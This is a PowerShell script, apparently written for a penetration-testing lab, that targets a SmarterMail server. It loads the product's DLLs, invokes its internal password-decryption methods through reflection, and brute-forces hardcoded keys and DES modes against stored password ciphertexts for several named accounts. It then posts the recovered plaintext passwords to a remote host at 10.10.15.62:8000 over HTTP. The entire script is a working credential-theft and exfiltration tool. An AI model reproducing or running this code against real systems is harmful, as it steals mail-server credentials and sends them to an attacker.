$ErrorActionPreference='Continue'
function Post($n,$t){ try{ $w=New-Object Net.WebClient; $w.Headers.Add('Content-Type','text/plain'); [void]$w.UploadData("http://10.10.15.62:8000/upload/$n",[Text.Encoding]::UTF8.GetBytes([string]$t)) }catch{ try{ (New-Object Net.WebClient).UploadString("http://10.10.15.62:8000/upload/$n",[string]$t)|Out-Null }catch{} } }
$log = New-Object Collections.Generic.List[string]
$svc = 'C:\Program Files (x86)\SmarterTools\SmarterMail\Service'
# Preload deps
Get-ChildItem $svc -Filter *.dll | ForEach-Object {
  try { [void][Reflection.Assembly]::LoadFrom($_.FullName) } catch {}
}
function GetTypesSafe($asm) {
  try { return $asm.GetTypes() } catch [Reflection.ReflectionTypeLoadException] {
    return @($_.Exception.Types | Where-Object { $_ -ne $null })
  } catch { return @() }
}
$flags = [Reflection.BindingFlags]'Public,NonPublic,Static,Instance'
$ciphers = @{
  'noah.b'='66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby'
  'svc_mail'='+I0tr+tzYqGdGi6H0Yu+4w=='
  'emma.s'='ay22OMASmD9ag6XU/s19LZRvj9d8pzBl'
}
$keys = @('a3oij89FF!apoife','$lEcl6istg1*!e*','G&ZJL!kN^1T$vc3!d1$','!$2wZNeZbULT9cIlGQ7g!n1R','03a8ur98qhfa9h')
$asms = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match 'SmarterMail|MailService|BouncyCastle' }
$log.Add("asms=$($asms.Count)")
foreach($a in $asms){ $log.Add("ASM $($a.GetName().Name)") }

foreach($a in $asms){
  foreach($t in (GetTypesSafe $a)){
    foreach($m in $t.GetMethods($flags)){
      if($m.Name -notmatch 'DecryptString|DecryptPassword|GetDecryptedPassword'){ continue }
      $ps = $m.GetParameters()
      $sig = ($ps | ForEach-Object { $_.ParameterType.Name }) -join ','
      $log.Add("METH $($t.FullName).$($m.Name)($sig) static=$($m.IsStatic)")
      # try invoke combos
      foreach($ks in $keys){
        foreach($user in $ciphers.Keys){
          $cipher = $ciphers[$user]
          $argsets = @()
          if($ps.Count -eq 1 -and $ps[0].ParameterType -eq [string]){ $argsets += ,@(,$cipher) }
          if($ps.Count -eq 2 -and $ps[0].ParameterType -eq [string] -and $ps[1].ParameterType -eq [string]){
            $argsets += ,@($ks,$cipher); $argsets += ,@($cipher,$ks)
          }
          if($ps.Count -eq 3){
            $argsets += ,@(0,$ks,$cipher)
            $argsets += ,@($ks,0,$cipher)
            $argsets += ,@(0,$cipher,$ks)
          }
          foreach($args in $argsets){
            try{
              if($m.IsStatic){ $r = $m.Invoke($null, $args) }
              else {
                $inst = $null
                try { $inst = [Activator]::CreateInstance($t, $true) } catch { try { $inst = [Activator]::CreateInstance($t) } catch {} }
                if($null -eq $inst){ continue }
                $r = $m.Invoke($inst, $args)
              }
              if($r){ $log.Add("OK $($m.Name) key=$ks user=$user => [$r]") }
            }catch{
              $msg = $_.Exception.InnerException.Message
              if(-not $msg){ $msg = $_.Exception.Message }
              # only log interesting failures once would be too much
            }
          }
        }
      }
    }
  }
}
# Pure .NET DES using same as Weak path: Mode CFB FeedbackSize 8, Padding PKCS7/ISO10126
$iv = [byte[]](155,26,93,86,0,0,0,0)
function GDCB([byte[]]$src){
  $tmp=New-Object byte[] 7; [Array]::Copy($src,0,$tmp,0,[Math]::Min(7,$src.Length))
  $o=New-Object byte[] 8; $o[0]=$tmp[0]
  for($i=1;$i -le 6;$i++){ $o[$i]=[byte]((($tmp[$i-1] -shl (8-$i)) -bor (($tmp[$i] -band 255) -shr $i)) -band 255) }
  $o[7]=[byte](($tmp[6] -shl 1) -band 255); return $o
}
foreach($ks in $keys){
  $kb=[Text.Encoding]::ASCII.GetBytes($ks)
  foreach($key in @((GDCB $kb), ($kb[0..7]))){
    if($key.Length -ne 8){ $k=New-Object byte[] 8; [Array]::Copy($key,0,$k,0,[Math]::Min(8,$key.Length)); $key=$k }
    foreach($mode in 'CBC','CFB'){
      foreach($pad in 'PKCS7','ISO10126','Zeros','None'){
        foreach($user in $ciphers.Keys){
          try{
            $des=[Security.Cryptography.DES]::Create()
            $des.Mode=[Enum]::Parse([Security.Cryptography.CipherMode],$mode)
            $des.Padding=[Enum]::Parse([Security.Cryptography.PaddingMode],$pad)
            $des.Key=$key; $des.IV=$iv
            if($mode -eq 'CFB'){ try{$des.FeedbackSize=8}catch{try{$des.FeedbackSize=64}catch{}} }
            $pt=$des.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($ciphers[$user]),0,([Convert]::FromBase64String($ciphers[$user])).Length)
            $s=[Text.Encoding]::UTF8.GetString($pt).Trim([char]0)
            $ok=$true; foreach($ch in $s.ToCharArray()){ if([int][char]$ch -lt 32 -or [int][char]$ch -gt 126){$ok=$false}}
            if($ok -and $s.Length -ge 4){ $log.Add("DESHIT $mode $pad keybytes=$([BitConverter]::ToString($key)) user=$user => $s") }
          }catch{}
        }
      }
    }
  }
}
if($log.Count -eq 0){ $log.Add('no hits') }
Post 'ps_decrypt2.txt' ($log -join "`n")
